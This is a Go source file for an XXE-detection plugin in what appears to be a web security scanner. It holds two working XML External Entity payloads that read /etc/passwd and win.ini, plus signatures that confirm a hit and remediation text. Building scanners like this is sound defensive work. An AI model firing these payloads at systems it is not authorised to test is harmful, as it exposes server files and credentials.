package plugins

import (
	"strings"

	"agentdast/internal/core"
	"agentdast/pkg/types"
)

// XXEPlugin tests XML endpoints for XML External Entity processing.
type XXEPlugin struct{}

func (p *XXEPlugin) Name() string             { return "xxe" }
func (p *XXEPlugin) Category() string         { return "injection" }
func (p *XXEPlugin) Severity() types.Severity { return types.SeverityHigh }
func (p *XXEPlugin) Description() string {
	return "Tests XML-accepting endpoints for XML External Entity (XXE) processing by reading local files"
}

func (p *XXEPlugin) DefaultPayloads() []string {
	return []string{
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
	}
}

var xxeSignatures = []string{"root:x:0:0:", "daemon:x:", "[fonts]", "; for 16-bit app support"}

func (p *XXEPlugin) Test(ctx *core.ScanContext) []types.Finding {
	// Only relevant when the endpoint accepts XML.
	if ctx.Endpoint.RequestBody == nil || !strings.Contains(strings.ToLower(ctx.Endpoint.RequestBody.ContentType), "xml") {
		return nil
	}
	var findings []types.Finding
	for _, payload := range p.DefaultPayloads() {
		if ctx.Ctx.Err() != nil {
			return findings
		}
		log := ctx.Executor.SendRawBody(ctx.Ctx, ctx.Endpoint, ctx.BaseURL, "application/xml", payload, ctx.Config)
		if log.Error != "" {
			continue
		}
		if sig, ok := matchSignal(log.ResponseBody, payload, xxeSignatures); ok {
			findings = append(findings, types.Finding{
				Title:       "XML External Entity (XXE) injection",
				Endpoint:    ctx.Endpoint.Path,
				Method:      ctx.Endpoint.Method,
				Payload:     payload,
				Evidence:    "matched local-file signature: " + sig + "\n" + evidence(log),
				Confidence:  types.ConfidenceConfirmed,
				Description: "The XML parser resolved an external entity and returned local file contents.",
				Remediation: "Disable DOCTYPE/external entity processing in the XML parser (set FEATURE_SECURE_PROCESSING / disallow-doctype-decl).",
				RequestLog:  logForMode(ctx, log),
			})
			break
		}
	}
	return findings
}
